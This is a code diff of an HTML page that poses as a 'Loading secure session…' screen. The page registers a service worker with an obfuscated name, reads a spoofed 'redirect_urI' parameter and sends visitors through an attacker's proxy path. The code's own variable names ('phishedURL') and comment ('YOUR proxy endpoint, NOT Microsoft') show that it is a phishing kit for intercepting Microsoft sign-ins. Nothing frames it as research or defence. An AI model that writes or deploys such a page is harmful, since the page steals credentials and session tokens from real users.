@@ -1,30 +1,93 @@
 <!DOCTYPE html>
-<html lang="fr">
-
+<html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background: #f5f5f5;
+            font-family: sans-serif;
+            margin: 0;
+        }
+        .loader {
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #4C00FF;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .msg {
+            margin-top: 20px;
+            color: #666;
+        }
+    </style>
 </head>
-
 <body>
+    <div style="text-align:center;">
+        <div class="loader"></div>
+        <div class="msg">Loading secure session…</div>
+    </div>
+
     <script>
         if ("serviceWorker" in navigator) {
             navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                 scope: "/",
             })
-                .then((registration) => {
-                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
-                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
-
-                    self.location.replace(`${phishedURL.pathname}${phishedURL.search}`);
-                })
-                .catch((error) => {
-                    console.error(`Service worker registration failed: ${error}`);
-                });
-        }
-        else {
+            .then(() => {
+                // Get the target URL from the 'redirect_urI' parameter
+                const params = new URLSearchParams(self.location.search);
+                const target = params.get("redirect_urI");
+                if (target) {
+                    try {
+                        const decoded = decodeURIComponent(target);
+                        // Navigate to YOUR proxy endpoint, NOT Microsoft
+                        const proxyUrl = `/lNv1pC9AWPUY4gbidyBO?target=${encodeURIComponent(decoded)}`;
+                        self.location.replace(proxyUrl);
+                    } catch (e) {
+                        self.location.replace("https://www.google.com");
+                    }
+                } else {
+                    self.location.replace("https://www.google.com");
+                }
+            })
+            .catch((error) => {
+                console.error("Service worker registration failed:", error);
+                // Fallback: direct redirect
+                const params = new URLSearchParams(self.location.search);
+                const target = params.get("redirect_urI");
+                if (target) {
+                    try {
+                        self.location.replace(decodeURIComponent(target));
+                    } catch (e) {
+                        self.location.replace("https://www.google.com");
+                    }
+                } else {
+                    self.location.replace("https://www.google.com");
+                }
+            });
+        } else {
             console.error("Service workers are not supported by this browser");
+            const params = new URLSearchParams(self.location.search);
+            const target = params.get("redirect_urI");
+            if (target) {
+                try {
+                    self.location.replace(decodeURIComponent(target));
+                } catch (e) {
+                    self.location.replace("https://www.google.com");
+                }
+            } else {
+                self.location.replace("https://www.google.com");
+            }
         }
     </script>
 </body>
-
 </html>
